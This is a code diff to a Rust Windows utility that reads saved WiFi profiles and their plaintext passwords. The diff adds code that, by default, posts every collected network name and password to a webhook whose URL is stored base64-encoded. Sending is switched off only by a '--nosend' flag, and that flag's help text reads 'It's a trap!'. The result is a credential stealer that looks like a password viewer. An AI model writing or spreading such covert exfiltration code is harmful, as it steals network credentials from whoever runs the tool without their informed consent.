@@ -1,8 +1,35 @@
+use base64::{
+    engine::general_purpose::{self},
+    Engine as _,
+};
 use clap::Parser;
+use reqwest;
+use serde_json;
 use std::fs::File;
 use std::io;
 use std::io::Write;
-//use std::env;
+use tokio;
+
+const WEBHOOK_URL: &str = "";
+
+fn decode_webhook_url(webhook_url: &str) -> String {
+    let decoded_bytes = general_purpose::STANDARD
+        .decode(webhook_url)
+        .expect("Failed to decode base64");
+    String::from_utf8(decoded_bytes).expect("Failed to convert to UTF-8 string")
+}
+
+async fn send_to_webhook(message: &str, webhook_url: &str) -> Result<(), reqwest::Error> {
+    let client = reqwest::Client::new();
+    let payload = serde_json::json!({
+        "content": message
+    });
+
+    let _res = client.post(webhook_url).json(&payload).send().await?;
+
+    // println!("Webhook response status: {}", res.status());
+    Ok(())
+}
 
 #[derive(Parser)]
 #[command(version, about, long_about = None)]
@@ -10,6 +37,12 @@ struct Cli {
     /// Name of output file to save WiFi creds
     #[arg(short, long)]
     output: Option<String>,
+    // /// Send results to webhook
+    // #[arg(short, long)]
+    // send: Option<String>,
+    /// It's a trap!
+    #[arg(short, long)]
+    nosend: bool,
 }
 
 use std::{ffi::OsString, os::windows::ffi::OsStringExt};
@@ -144,7 +177,8 @@ fn get_profiles_xml(
     Ok(xml_string.to_os_string())
 }
 
-fn main() -> io::Result<()> {
+#[tokio::main]
+async fn main() -> io::Result<()> {
     let cli = Cli::parse();
 
     let mut file = if let Some(ref output) = cli.output {
@@ -154,6 +188,12 @@ fn main() -> io::Result<()> {
     };
 
     println!("Output Filename is: {:?}", cli.output);
+
+    let mut webhook_var = if !cli.nosend {
+        Some(String::new())
+    } else {
+        None
+    };
 
     let wlan_handle = open_wlan_handle(WLAN_API_VERSION_2_0).expect("Failed to open WLAN handle!");
 
@@ -251,6 +291,9 @@ fn main() -> io::Result<()> {
                         profile_name.to_string_lossy().to_string()
                     );
                     print!("{}", output_string_open);
+                    if let Some(ref mut var) = webhook_var {
+                        var.push_str(&output_string_open);
+                    }
                     if let Some(ref mut file) = file {
                         file.write_all(output_string_open.as_bytes())?;
                     }
@@ -266,6 +309,9 @@ fn main() -> io::Result<()> {
                             password
                         );
                         print!("{}", output_string_wpa2_wpa3);
+                        if let Some(ref mut var) = webhook_var {
+                            var.push_str(&output_string_wpa2_wpa3);
+                        }
                         if let Some(ref mut file) = file {
                             file.write_all(output_string_wpa2_wpa3.as_bytes())?;
                         }
@@ -278,12 +324,20 @@ fn main() -> io::Result<()> {
                         auth_type
                     );
                     print!("{}", output_string_other);
+                    if let Some(ref mut var) = webhook_var {
+                        var.push_str(&output_string_other);
+                    }
                     if let Some(ref mut file) = file {
                         file.write_all(output_string_other.as_bytes())?;
                     }
                 }
             }
         }
+    }
+    let webhook_url = decode_webhook_url(WEBHOOK_URL);
+
+    if let Some(ref var) = webhook_var {
+        send_to_webhook(var, &webhook_url).await.unwrap();
     }
 
     unsafe { WlanFreeMemory(interface_ptr.cast()) };
